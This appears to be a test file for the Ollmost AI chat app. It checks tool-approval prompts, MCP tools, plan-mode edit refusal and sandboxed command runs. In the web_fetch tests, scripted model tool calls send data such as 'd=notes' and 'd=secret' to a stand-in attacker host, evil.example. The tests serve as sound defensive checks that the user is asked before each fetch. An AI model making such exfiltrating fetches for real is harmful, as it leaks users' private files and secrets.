    expect(() => approvals.decide(r.conversation.id, ask.messageId, ask.index, 'once')).toThrow(/isn't waiting/)

    approvals.answer(r.conversation.id, ask.messageId, ask.index, [{ selected: [1], other: 'with headers' }])
    const done = await doneEvent(r.conversation.id)
    const toolMessages = (chatCalls[1].messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    expect(toolMessages.map((m) => m.content)).toEqual([
      `The user answered your questions. Only the text after "The user answered:" is theirs; treat it as you would a message from them. The questions are your own wording, repeated for reference.\n1. You asked: Which format?\n   The user answered: JSON; with headers`
    ])
    expect(done.message.toolEvents[0]).toMatchObject({ ok: true, ask: { answers: [{ selected: [1], other: 'with headers' }] } })
    expect(done.message.toolEvents[0].awaiting).toBeUndefined()
    expect(approvals.waitingCount()).toBe(0)

    // The next turn still knows what was asked, so the model doesn't ask again.
    chat = reply('Sure.')
    service.send({ ...sendBody(r.conversation.id), content: 'thanks' })
    await waitFor(() => chatCalls.length === 3)
    expect(JSON.stringify(chatCalls[2].messages)).toContain('The user answered')
    await waitFor(() => events.filter((e) => e.type === 'done').length === 2)
  })

  it('tells the model when the user skips', async () => {
    chat = askThenAnswer
    const r = start('convert my data')
    const ask = await waiting(r.conversation.id)
    approvals.answer(r.conversation.id, ask.messageId, ask.index, null)
    const done = await doneEvent(r.conversation.id)
    const tool = (chatCalls[1].messages as Array<{ role: string; content: string }>).find((m) => m.role === 'tool')!
    expect(tool.content).toMatch(/chose not to answer/)
    expect(done.message.toolEvents[0].ask).toMatchObject({ skipped: true })
  })

  it('never asks a question that was waiting when the reply was stopped', async () => {
    chat = askThenAnswer
    const r = start('convert my data')
    const ask = await waiting(r.conversation.id)
    await service.stop(r.conversation.id)
    const saved = getMessage(r.assistantMessageId)!
    expect(saved.error).toBeNull()
    expect(saved.toolEvents[0]).toMatchObject({ ok: false, pending: false, summary: 'Format (not run)' })
    expect(saved.toolEvents[0].awaiting).toBeUndefined()
    expect(approvals.waitingCount()).toBe(0)
    expect(() => approvals.answer(r.conversation.id, ask.messageId, ask.index, null)).toThrow(/aren't waiting/)
  })

  it('is not offered when the setting is off', async () => {
    updateSettings({ chat: { askUser: false } })
    try {
      chat = reply('Hi.')
      await doneEvent(start('hello').conversation.id)
      expect(chatCalls[0].tools).toBeUndefined()
    } finally {
      updateSettings({ chat: { askUser: true } })
    }
  })
})

describe('MCP servers in a reply', () => {
  const FIXTURE = new URL('./fixtures/mcp-server.mjs', import.meta.url).pathname
  afterAll(() => mcpManager.stopAll())
  const sendIn = (conversationId: string | null, content: string, toolSources: string[]) =>
    service.send({
      conversationId,
      projectId: null,
      content,
      attachmentIds: [],
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      toolSources
    })
  const tools = (call: Record<string, unknown>) => ((call.tools as Array<{ function: { name: string } }>) ?? []).map((t) => t.function.name)

  it("offers the chat's servers, asks before a call, and gives the model the result", async () => {
    const server = mcpConfig.saveServer({
      name: 'Fixture',
      command: process.execPath,
      args: [FIXTURE],
      cwd: null,
      env: {},
      defaultOn: true
    })
    chat = (b, res, n) => (n === 1 ? void res.writeHead(200).end(toolCall('fixture__echo', { text: 'hi' })) : reply('Done.')(b, res, n))
    const r = sendIn(null, 'echo hi', [`mcp:${server.id}`])
    expect(getConversation(r.conversation.id)!.toolSources).toEqual(['mcp:fixture'])
    const ask = await waitFor(() =>
      events.find(
        (e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === r.conversation.id && !!e.event.awaiting
      )
    )
    expect(ask.event).toMatchObject({ tool: 'fixture__echo', source: 'Fixture', summary: 'hi' })
    expect(tools(chatCalls[0])).toContain('fixture__lookup_codename')
    expect((chatCalls[0].messages as Array<{ content: string }>)[0].content).toMatch(/MCP servers \(Fixture\)/)

    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'once')
    const done = await doneEvent(r.conversation.id)
    const results = (chatCalls[1].messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    expect(results.map((m) => m.content)).toEqual(['echo: hi'])
    expect(done.message.toolEvents[0]).toMatchObject({ tool: 'fixture__echo', ok: true, source: 'Fixture' })
    // A chat with tool sources gets more rounds; its debugger trace names the server.
    const trace = listTraces(r.conversation.id).find((t) => t.kind === 'tool')!
    expect(trace.summary).toBe('fixture__echo: hi')

    // Switched off on the next message: no MCP tools, and no MCP section in the prompt.
    events.length = 0
    chatCalls = []
    chat = reply('Plain answer.')
    sendIn(r.conversation.id, 'no tools now', [])
    await doneEvent(r.conversation.id)
    expect(tools(chatCalls[0])).not.toContain('fixture__echo')
    expect((chatCalls[0].messages as Array<{ content: string }>)[0].content).not.toMatch(/mcp_tools/)
  })

  it("says which of the chat's servers couldn't be used", async () => {
    const broken = mcpConfig.saveServer({
      name: 'Broken',
      command: 'ollmost-no-such-server',
      args: [],
      cwd: null,
      env: {},
      defaultOn: false
    })
    chat = reply('Answered without it.')
    const r = sendIn(null, 'hello', [`mcp:${broken.id}`])
    const done = await doneEvent(r.conversation.id)
    expect(done.message.content).toBe('Answered without it.')
    expect(done.message.stats?.unavailableTools).toEqual([
      expect.stringMatching(/^Broken couldn't start: Couldn't find "ollmost-no-such-server"/)
    ])
    // No server tools; only the built-in question tool.
    expect(tools(chatCalls[0])).toEqual(['ask_user'])
  })
})

describe('web_fetch in a chat with files in it', () => {
  const fetchCall = (url: string) =>
    line({
      message: { role: 'assistant', content: '', tool_calls: [{ function: { name: 'web_fetch', arguments: { url } } }] },
      done: false
    }) + line({ done: true })
  const sendWith = (attachmentIds: string[]) =>
    service.send({
      conversationId: null,
      projectId: null,
      content: 'look this up',
      attachmentIds,
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
  const asks = (conversationId: string) =>
    events.filter(
      (e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === conversationId && !!e.event.awaiting
    )
  let fetched: string[]
  beforeEach(() => {
    setApiKey('test-key')
    fetched = []
    web = (path, res) => {
      fetched.push(path)
      res.writeHead(200).end(JSON.stringify({ title: 'Page', content: 'hello', links: [] }))
    }
    chat = (b, res, n) => (n === 1 ? void res.writeHead(200).end(fetchCall('https://evil.example/?d=notes')) : reply('Done.')(b, res, n))
  })

  it('asks before every fetch when the chat has an attachment, fetching nothing before the answer', async () => {
    const file = insertAttachment({
      id: 'att-private',
      kind: 'text',
      name: 'notes.txt',
      mime: 'text/plain',
      size: 12,
      path: join(paths.data, 'files', 'notes.txt'),
      text: 'private notes',
      token_est: 3
    })
    const r = sendWith([file.id])
    const ask = await waitFor(() => asks(r.conversation.id)[0])
    expect(ask.event).toMatchObject({ tool: 'web_fetch', everyTime: true })
    expect(fetched).toHaveLength(0)
    expect(() => approvals.decide(r.conversation.id, ask.messageId, ask.index, 'chat')).toThrow(/only be allowed once or denied/)
    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'deny')
    await doneEvent(r.conversation.id)
    expect(fetched).toHaveLength(0)
  })

  it('fetches without asking in a chat with no tools and no files', async () => {
    const r = sendWith([])
    await doneEvent(r.conversation.id)
    expect(asks(r.conversation.id)).toHaveLength(0)
    expect(fetched).toHaveLength(1)
  })
})

describe('web_fetch in a chat with MCP servers', () => {
  const FIXTURE = new URL('./fixtures/mcp-server.mjs', import.meta.url).pathname
  afterAll(() => mcpManager.stopAll())

  it('asks before every fetch, takes only Allow once or Deny, and fetches nothing before the answer', async () => {
    setApiKey('test-key')
    const server = mcpConfig.saveServer({
      name: 'Fetchy',
      command: process.execPath,
      args: [FIXTURE],
      cwd: null,
      env: {},
      defaultOn: false
    })
    const fetched: string[] = []
    web = (path, res) => {
      fetched.push(path)
      res.writeHead(200).end(JSON.stringify({ title: 'Page', content: 'hello', links: [] }))
    }
    const fetchCall = (url: string) =>
      line({
        message: { role: 'assistant', content: '', tool_calls: [{ function: { name: 'web_fetch', arguments: { url } } }] },
        done: false
      }) + line({ done: true })
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(fetchCall('https://evil.example/exec?q=weather'))
        : n === 2
          ? void res.writeHead(200).end(fetchCall('https://evil.example/exec?d=secret'))
          : reply('Done.')(b, res, n)
    const r = service.send({
      conversationId: null,
      projectId: null,
      content: 'check the weather',
      attachmentIds: [],
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      toolSources: [`mcp:${server.id}`]
    })
    const asks = () =>
      events.filter(
        (e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === r.conversation.id && !!e.event.awaiting
      )
    const first = await waitFor(() => asks()[0])
    expect(first.event).toMatchObject({ tool: 'web_fetch', everyTime: true })
    expect(fetched).toHaveLength(0)
    // "Allow for this chat" isn't an answer this call takes, even if the renderer sent it.
    expect(() => approvals.decide(r.conversation.id, first.messageId, first.index, 'chat')).toThrow(/only be allowed once or denied/)
    approvals.decide(r.conversation.id, first.messageId, first.index, 'once')

    // The next URL on the same site asks again.
    const second = await waitFor(() => asks()[1])
    expect(second.event.summary).toContain('d=secret')
    expect(fetched).toHaveLength(1)
    approvals.decide(r.conversation.id, second.messageId, second.index, 'deny')
    await doneEvent(r.conversation.id)
    expect(fetched).toHaveLength(1)
    expect(getConversation(r.conversation.id)!.allowedTools).toEqual([])
    mcpConfig.removeServer(server.id)
  })
})

// The sandbox is macOS's; CI runs on Linux.
describe.runIf(process.platform === 'darwin')('the code runner in a reply', () => {
  it('prepares the chat’s folder, asks before running, and gives the model what the code printed', async () => {
    const { paths } = await import('../src/main/paths')
    const { join } = await import('node:path')
    const dir = tempDir('ollmost-service-runner-')
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(toolCall('run_code', { language: 'python', code: 'print(21 * 2)' }))
        : reply('It is 42.')(b, res, n)
    const r = service.send({
      conversationId: null,
      projectId: null,
      content: 'what is 21*2? use code',
      attachmentIds: [],
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      toolSources: ['code']
    })
    const ask = await waitFor(
      () =>
        events.find(
          (e): e is Extract<ChatEvent, { type: 'tool' }> =>
            e.type === 'tool' && e.conversationId === r.conversation.id && !!e.event.awaiting
        ),
      30_000
    )
    const system = (chatCalls[0].messages as Array<{ content: string }>)[0].content
    expect(system).toMatch(/<code_runner>/)
    expect(system).not.toMatch(/You cannot run code/)
    expect(((chatCalls[0].tools as Array<{ function: { name: string } }>) ?? []).map((t) => t.function.name)).toContain('run_code')
    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'once')
    const done = await waitFor(
      () => events.find((e): e is Extract<ChatEvent, { type: 'done' }> => e.type === 'done' && e.conversationId === r.conversation.id),
      60_000
    )
    const results = (chatCalls[1].messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    expect(results[0].content).toMatch(/^Exit code 0\.\n\n42/)
    expect(done.message.toolEvents[0]).toMatchObject({ tool: 'run_code', ok: true })
  }, 120_000)

  // #88: a code session's reply works in the user's folder with run_command, under the session's prompt.
  it('offers only reading in plan mode, and the approved plan once the user starts working', async () => {
    const { paths } = await import('../src/main/paths')
    const { realpathSync } = await import('node:fs')
    const { join } = await import('node:path')
    const dir = tempDir('ollmost-service-plan-')
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(tempDir('ollmost-user-repo-'))
    const session = createConversation({
      projectId: null,
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'repo'
    })
    expect(session).toMatchObject({ stage: 'work', plan: null })
    expect(service.setStage(session.id, 'plan')).toMatchObject({ stage: 'plan', plan: null })
    const plan = 'Plan: 1. Read README.md. 2. Change the greeting. 3. Run the tests.'
    chat = reply(plan)
    const r = service.send({ ...sendBody(session.id), content: 'plan a greeting change' })
    await doneEvent(r.conversation.id)
    const offered = (calls: number) => ((chatCalls[calls].tools as Array<{ function: { name: string } }>) ?? []).map((t) => t.function.name)
    expect(offered(0)).toEqual(['ask_user', 'read_file', 'list_files', 'search_files', 'delegate'])
    const system = (chatCalls[0].messages as Array<{ content: string }>)[0].content
    expect(system).toMatch(/<plan_mode>/)
    expect(system).not.toMatch(/<approved_plan>/)
    // The working rules don't tell it to edit and run while it can't.
    expect(system).not.toMatch(/edit_file replaces one exact passage/)
    expect(system).toMatch(/read_file/)
    // The plan is the reply written in plan mode, kept as it finishes; starting work keeps it, and the next reply has
    // every tool and the plan in front of it.
    await waitFor(() => !service.isReplying())
    expect(getConversation(session.id)?.plan).toBe(plan)
    // Plan chosen again while already planning (a misclick on the checked item) keeps the plan (#139).
    expect(service.setStage(session.id, 'plan')).toMatchObject({ stage: 'plan', plan })
    expect(getConversation(session.id)).toMatchObject({ stage: 'plan', plan })
    expect(service.setStage(session.id, 'work')).toMatchObject({ stage: 'work', plan })
    // Work chosen again keeps it too.
    expect(service.setStage(session.id, 'work')).toMatchObject({ stage: 'work', plan })
    chat = reply('Doing it.')
    events.length = 0
    const next = service.send({ ...sendBody(session.id), content: 'go ahead' })
    await doneEvent(next.conversation.id)
    expect(offered(1)).toEqual([
      'ask_user',
      'read_file',
      'list_files',
      'search_files',
      'edit_file',
      'write_file',
      'run_command',
      'delegate'
    ])
    const later = (chatCalls[1].messages as Array<{ content: string }>)[0].content
    expect(later).toMatch(/<approved_plan>[\s\S]*Change the greeting[\s\S]*<\/approved_plan>/)
    expect(later).not.toMatch(/<plan_mode>/)
    // Back to planning drops the approved plan: a new one will come.
    await waitFor(() => !service.isReplying())
    expect(service.setStage(session.id, 'plan')).toMatchObject({ stage: 'plan', plan: null })
    // Two replies in a sandboxed session: more than the default 5 s on a busy macOS runner.
  }, 30_000)

  it('keeps no plan when nothing was written in plan mode, and none of a chat', async () => {
    const { paths } = await import('../src/main/paths')
    const { realpathSync } = await import('node:fs')
    const { join } = await import('node:path')
    const dir = tempDir('ollmost-service-plan-')
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(tempDir('ollmost-user-repo-'))
    const session = createConversation({
      projectId: null,
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'repo'
    })
    chat = reply('I renamed foo to bar and the tests pass.')
    const r = service.send({ ...sendBody(session.id), content: 'rename foo' })
    await doneEvent(r.conversation.id)
    await waitFor(() => !service.isReplying())
    // A work report is no plan: going to Plan and back keeps nothing, and the next reply isn't told to carry it out.
    expect(service.setStage(session.id, 'plan')).toMatchObject({ stage: 'plan', plan: null })
    expect(service.setStage(session.id, 'work')).toMatchObject({ stage: 'work', plan: null })
    events.length = 0
    const next = service.send({ ...sendBody(session.id), content: 'and now?' })
    await doneEvent(next.conversation.id)
    expect((chatCalls[1].messages as Array<{ content: string }>)[0].content).not.toMatch(/<approved_plan>/)
    // A chat has no stage to set.
    chat = reply('hello')
    await waitFor(() => !service.isReplying())
    const plain = start('hi')
    await doneEvent(plain.conversation.id)
    await waitFor(() => !service.isReplying())
    expect(() => service.setStage(plain.conversation.id, 'plan')).toThrow(/code session/i)
  })

  it('takes the tools away after a second round of nothing but refused writes in plan mode', async () => {
    const { paths } = await import('../src/main/paths')
    const { realpathSync, writeFileSync } = await import('node:fs')
    const { join } = await import('node:path')
    const dir = tempDir('ollmost-service-plan-')
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(tempDir('ollmost-user-repo-'))
    writeFileSync(join(folder, 'README.md'), 'Hello\n')
    const session = createConversation({
      projectId: null,
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'repo'
    })
    service.setStage(session.id, 'plan')
    chat = (b, res, n) =>
      n <= 2
        ? void res.writeHead(200).end(toolCall('edit_file', { path: 'README.md', old_string: 'Hello', new_string: 'Bonjour' }))
        : reply('Fine, here is the plan.')(b, res, n)
    const r = service.send({ ...sendBody(session.id), content: 'just do it' })
    await doneEvent(r.conversation.id)
    const offered = (calls: number) => ((chatCalls[calls].tools as Array<{ function: { name: string } }>) ?? []).map((t) => t.function.name)
    expect(offered(1)).toContain('read_file')
    expect(offered(2)).toEqual([])
  })

  it('keeps no plan from a reply the user stopped', async () => {
    const { paths } = await import('../src/main/paths')
    const { realpathSync } = await import('node:fs')
    const { join } = await import('node:path')
    const dir = tempDir('ollmost-service-plan-')
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(tempDir('ollmost-user-repo-'))
    const session = createConversation({
      projectId: null,
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'repo'
    })
    service.setStage(session.id, 'plan')
    chat = (_b, res) => streamChunks(res, [line({ message: { role: 'assistant', content: 'Half a plan' }, done: false })]) // then hangs
    const r = service.send({ ...sendBody(session.id), content: 'plan it' })
    await waitFor(() => events.some((e) => e.type === 'delta' && e.conversationId === r.conversation.id))
    await service.stop(r.conversation.id, { quiet: true })
    expect(getMessage(r.assistantMessageId)?.content).toBe('Half a plan')
    expect(getConversation(session.id)?.plan).toBeNull()
  })

  it('drops the earlier plan as a revision starts, so a stopped revision never leaves it under Start working (#141)', async () => {
    const { paths } = await import('../src/main/paths')
    const { realpathSync } = await import('node:fs')
    const { join } = await import('node:path')
    const dir = tempDir('ollmost-service-plan-')
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(tempDir('ollmost-user-repo-'))
    const session = createConversation({
      projectId: null,
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'repo'
    })
    service.setStage(session.id, 'plan')
    chat = reply('Plan A: rename it.')
    const first = service.send({ ...sendBody(session.id), content: 'plan it' })
    await doneEvent(first.conversation.id)
    await waitFor(() => !service.isReplying())
    expect(getConversation(session.id)?.plan).toBe('Plan A: rename it.')
    chat = (_b, res) => streamChunks(res, [line({ message: { role: 'assistant', content: 'Plan B, half' }, done: false })]) // then hangs
    const second = service.send({ ...sendBody(session.id), content: 'revise it' })
    // Gone as the revision starts: what the renderer is handed offers no plan to approve.
    expect(second.conversation.plan).toBeNull()
    await waitFor(() => events.some((e) => e.type === 'delta' && e.conversationId === second.conversation.id))
    await service.stop(second.conversation.id, { quiet: true })
    expect(getMessage(second.assistantMessageId)?.content).toBe('Plan B, half')
    expect(getConversation(session.id)?.plan).toBeNull()
    // Starting work now carries no plan, so the model is never told to carry out plan A.
    expect(service.setStage(session.id, 'work')).toMatchObject({ stage: 'work', plan: null })
  })

  it('refuses an edit the model attempts in plan mode', async () => {
    const { paths } = await import('../src/main/paths')
    const { realpathSync, writeFileSync, readFileSync } = await import('node:fs')
    const { join } = await import('node:path')
    const dir = tempDir('ollmost-service-plan-')
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(tempDir('ollmost-user-repo-'))
    writeFileSync(join(folder, 'README.md'), 'Hello\n')
    const session = createConversation({
      projectId: null,
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'repo'
    })
    service.setStage(session.id, 'plan')
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(toolCall('edit_file', { path: 'README.md', old_string: 'Hello', new_string: 'Bonjour' }))
        : reply('I cannot edit in plan mode.')(b, res, n)
    const r = service.send({ ...sendBody(session.id), content: 'just do it' })
    const done = await doneEvent(r.conversation.id)
    expect(readFileSync(join(folder, 'README.md'), 'utf8')).toBe('Hello\n')
    expect(done.message.toolEvents[0]).toMatchObject({ tool: 'edit_file', ok: false })
    // A refusal, not an unknown tool: the model is told why, and keeps its reading tools for the rest of the reply.
    expect(done.message.toolEvents[0].unknown).toBeUndefined()
    const told = (chatCalls[1].messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    expect(told[0].content).toMatch(/plan mode/i)
    const offered = ((chatCalls[1].tools as Array<{ function: { name: string } }>) ?? []).map((t) => t.function.name)
    expect(offered).toEqual(expect.arrayContaining(['read_file', 'list_files', 'search_files']))
    expect(offered).not.toContain('edit_file')
    expect(events.some((e) => e.type === 'tool' && e.conversationId === r.conversation.id && !!e.event.awaiting)).toBe(false)
  })

  it('runs a command in a session’s folder after asking, and remembers Allow for this session', async () => {
    const { paths } = await import('../src/main/paths')
    const { realpathSync, writeFileSync, existsSync } = await import('node:fs')
    const { join } = await import('node:path')
    const dir = tempDir('ollmost-service-session-')
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(tempDir('ollmost-user-repo-'))
    writeFileSync(join(folder, 'CLAUDE.md'), 'Say hello in French.')
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(toolCall('run_command', { command: 'echo bonjour > greeting.txt && cat greeting.txt' }))
        : reply('Done: bonjour.')(b, res, n)
    const session = createConversation({
      projectId: null,
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'repo'
    })
    const r = service.send({
      conversationId: session.id,
      projectId: null,
      content: 'make a greeting file',
      attachmentIds: [],
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    const ask = await waitFor(
      () =>
        events.find(
          (e): e is Extract<ChatEvent, { type: 'tool' }> =>
            e.type === 'tool' && e.conversationId === r.conversation.id && !!e.event.awaiting
        ),
      30_000
    )
    expect(ask.event).toMatchObject({ tool: 'run_command', args: { command: 'echo bonjour > greeting.txt && cat greeting.txt' } })
    const system = (chatCalls[0].messages as Array<{ content: string }>)[0].content
    expect(system).toMatch(/coding agent running inside Ollmost/)
    expect(system).toMatch(new RegExp(`working in the folder ${folder}`))
    expect(system).toMatch(/<project_instructions file="CLAUDE\.md">[\s\S]*Say hello in French/)
    expect(system).not.toMatch(/<artifacts>|<code_runner>/)
    const offered = ((chatCalls[0].tools as Array<{ function: { name: string } }>) ?? []).map((t) => t.function.name)
    expect(offered).toContain('run_command')
    expect(offered).not.toContain('run_code')
    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'chat')
    const done = await waitFor(
      () => events.find((e): e is Extract<ChatEvent, { type: 'done' }> => e.type === 'done' && e.conversationId === r.conversation.id),
      60_000
    )
    const results = (chatCalls[1].messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    expect(results[0].content).toMatch(/^Exit code 0\.\n\nbonjour/)
    expect(done.message.toolEvents[0]).toMatchObject({
      tool: 'run_command',
      ok: true,
      summary: 'echo bonjour > greeting.txt && cat greeting.txt'
    })
    expect(existsSync(join(folder, 'greeting.txt'))).toBe(true)
    expect(getConversation(session.id)!.allowedTools).toEqual(['code:commands'])
    expect(existsSync(join(dir, 'runner', 'sessions', session.id, 'home'))).toBe(true)
    // The session's title stays: only a 'New chat' gets titled (an earlier test's title request may still arrive here).
    await new Promise((resolve) => setTimeout(resolve, 300))
    expect(titleCalls.some((t) => JSON.stringify(t).includes('make a greeting file'))).toBe(false)
    expect(getConversation(session.id)!.title).toBe('repo')
  }, 120_000)

  // #93: a session's file tools in one turn: a read that runs unasked, an edit that asks and shows its diff, then a
  // command that asks under its own key.
  it('reads, edits after asking with a diff, and runs a command, in one turn', async () => {
    const { paths } = await import('../src/main/paths')
    const { realpathSync, writeFileSync, readFileSync } = await import('node:fs')
    const { join } = await import('node:path')
    const dir = tempDir('ollmost-service-files-')
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(tempDir('ollmost-user-repo-'))
    writeFileSync(join(folder, 'hello.py'), 'print("hello")\n')
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(toolCall('read_file', { path: 'hello.py' }))
        : n === 2
          ? void res.writeHead(200).end(toolCall('edit_file', { path: 'hello.py', old_string: 'hello', new_string: 'bonjour' }))
          : n === 3
            ? void res.writeHead(200).end(toolCall('run_command', { command: 'cat hello.py' }))
            : reply('Changed the greeting.')(b, res, n)
    const session = createConversation({
      projectId: null,
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'repo'
    })
    const r = service.send({
      conversationId: session.id,
      projectId: null,
      content: 'say bonjour instead',
      attachmentIds: [],
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    const asks = (index: number) =>
      waitFor(
        () =>
          events.find(
            (e): e is Extract<ChatEvent, { type: 'tool' }> =>
              e.type === 'tool' && e.conversationId === r.conversation.id && e.index === index && !!e.event.awaiting
          ),
        30_000
      )
    const edit = await asks(1)
    expect(edit.event).toMatchObject({
      tool: 'edit_file',
      args: { path: 'hello.py', old_string: 'hello', new_string: 'bonjour' },
      diff: '--- a/hello.py\n+++ b/hello.py\n@@ -1,1 +1,1 @@\n-print("hello")\n+print("bonjour")',
      changed: { added: 1, removed: 1 }
    })
    // The read ran unasked, and the model got the numbered file.
    const offered = ((chatCalls[0].tools as Array<{ function: { name: string } }>) ?? []).map((t) => t.function.name)
    expect(offered).toEqual(['ask_user', 'read_file', 'list_files', 'search_files', 'edit_file', 'write_file', 'run_command', 'delegate'])
    const results = (i: number) => (chatCalls[i].messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    expect(results(1)[0].content).toBe('hello.py (1 line)\n\n     1\tprint("hello")')
    approvals.decide(r.conversation.id, edit.messageId, edit.index, 'chat')
    const command = await asks(2)
    expect(command.event).toMatchObject({ tool: 'run_command', args: { command: 'cat hello.py' } })
    expect(results(2)[1].content).toMatch(/^Edited hello\.py \(\+1 −1\)\.\n\n--- a\/hello\.py/)
    approvals.decide(r.conversation.id, command.messageId, command.index, 'once')
    const done = await waitFor(
      () => events.find((e): e is Extract<ChatEvent, { type: 'done' }> => e.type === 'done' && e.conversationId === r.conversation.id),
      60_000
    )
    expect(results(3)[2].content).toMatch(/^Exit code 0\.\n\nprint\("bonjour"\)/)
    expect(done.message.toolEvents.map((e) => [e.tool, e.ok, e.summary])).toEqual([
      ['read_file', true, '1 line'],
      ['edit_file', true, '+1 −1'],
      ['run_command', true, 'cat hello.py']
    ])
    expect(done.message.toolEvents[1]).toMatchObject({ files: [{ path: 'hello.py', size: 17 }], changed: { added: 1, removed: 1 } })
    expect(done.message.toolEvents[1].diff).toMatch(/^--- a\/hello\.py/)
    expect(readFileSync(join(folder, 'hello.py'), 'utf8')).toBe('print("bonjour")\n')
    // Allow for this session covered the edit; the command was allowed once.
    expect(getConversation(session.id)!.allowedTools).toEqual(['code:edits'])
  }, 120_000)

  it('doesn’t ask about an edit that can’t be made: the model gets the failure', async () => {
    const { paths } = await import('../src/main/paths')
    const { realpathSync, writeFileSync, readFileSync } = await import('node:fs')
    const { join } = await import('node:path')
    const dir = tempDir('ollmost-service-refused-')
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(tempDir('ollmost-user-repo-'))
    writeFileSync(join(folder, 'hello.py'), 'print("hello")\n')
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(toolCall('edit_file', { path: 'hello.py', old_string: 'goodbye', new_string: 'bonjour' }))
        : reply('Nothing to change.')(b, res, n)
    const session = createConversation({
      projectId: null,
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'repo'
    })
    const r = service.send({
      conversationId: session.id,
      projectId: null,
      content: 'say bonjour instead of goodbye',
      attachmentIds: [],
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    const done = await waitFor(
      () => events.find((e): e is Extract<ChatEvent, { type: 'done' }> => e.type === 'done' && e.conversationId === r.conversation.id),
      60_000
    )
    expect(events.filter((e) => e.type === 'tool' && e.conversationId === r.conversation.id && e.event.awaiting)).toEqual([])
    expect(done.message.toolEvents.map((e) => [e.tool, e.ok, e.summary])).toEqual([['edit_file', false, 'old_string not found']])
    const results = (chatCalls[1].messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    expect(results[0].content).toMatch(/^Error: old_string was not found in hello\.py/)
    expect(readFileSync(join(folder, 'hello.py'), 'utf8')).toBe('print("hello")\n')
    expect(getConversation(session.id)!.allowedTools).toEqual([])
  }, 60_000)

  it('says when a session’s folder is gone, and offers no code tools that turn', async () => {
    const { realpathSync, rmSync } = await import('node:fs')
    const folder = realpathSync(tempDir('ollmost-user-gone-'))
    const session = createConversation({
      projectId: null,
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'gone'
    })
    rmSync(folder, { recursive: true })
    chat = reply('I cannot see the folder.')
    const r = service.send({
      conversationId: session.id,
      projectId: null,
      content: 'hi',
      attachmentIds: [],
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    const done = await doneEvent(r.conversation.id)
    expect(done.message.stats?.unavailableTools?.[0]).toMatch(
      /This session's tools aren't available: This session's folder is no longer at/
    )
    // No code tools, only the question tool every tools-capable reply is offered.
    expect(((chatCalls[0].tools as Array<{ function: { name: string } }>) ?? []).map((t) => t.function.name)).toEqual(['ask_user'])
    expect((chatCalls[0].messages as Array<{ content: string }>)[0].content).toMatch(/coding agent/)
  })

  // #129: what a message's @ tokens name is read as the reply starts, sent before the message, and kept with it.
  it('sends the files an @ names, keeps what was sent for a Retry, and reads them again after an edit', async () => {
    const { paths } = await import('../src/main/paths')
    const { mkdirSync, realpathSync, writeFileSync } = await import('node:fs')
    const { join } = await import('node:path')
    const dir = tempDir('ollmost-service-refs-')
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(tempDir('ollmost-user-refs-'))
    mkdirSync(join(folder, 'src'))
    writeFileSync(join(folder, 'src', 'a.ts'), 'one\ntwo\n')
